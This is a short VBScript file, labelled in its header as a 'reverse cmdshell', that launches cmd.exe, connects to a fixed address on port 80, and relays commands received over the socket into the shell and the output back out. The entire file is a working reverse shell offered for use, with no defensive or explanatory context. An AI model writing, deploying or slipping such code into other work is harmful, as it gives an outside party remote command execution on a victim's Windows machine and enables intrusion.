'vbscript reverse cmdshell ???
'code by ylbhz@hotmail.com

Set sock = WScript.CreateObject("MSWinsock.Winsock", "sock_")
Set cmd = CreateObject("Wscript.Shell").Exec("cmd")

sock.Connect "192.168.1.4", 80

Sub sock_Connect()
	WScript.Echo "Connected."
	cmd.StdIn.WriteLine(Chr(&H01))
	sock.SendData GetStdOut
End Sub

Sub sock_DataArrival(Byval b)
    Dim data
    sock.GetData data, vbString
    If LCase(Left(data, 4)) = "exit" Then ExitShell
    cmd.StdIn.Write(data)
    cmd.StdIn.WriteLine(Chr(&H01))
    sock.SendData GetStdOut
End Sub

Sub sock_Error(number, Description, Scode, Source, HelpFile, HelpContext, CancelDisplay)
	Wscript.Echo Description
	Wscript.Quit
End Sub

Do
	Wscript.Sleep 1
Loop

Function GetStdOut
	Dim strline
	Dim strout
	Do
		strline = cmd.StdOut.Read(1)
		If Asc(strline) = &H01 Then Exit Do
		strout = strout & strline
	Loop
	GetStdOut = strout
End Function

Sub ExitShell
	WScript.Echo "Terminate cmd process."
	cmd.Terminate
	WScript.Echo "Close socket."
	sock.Close
	WScript.Quit
End Sub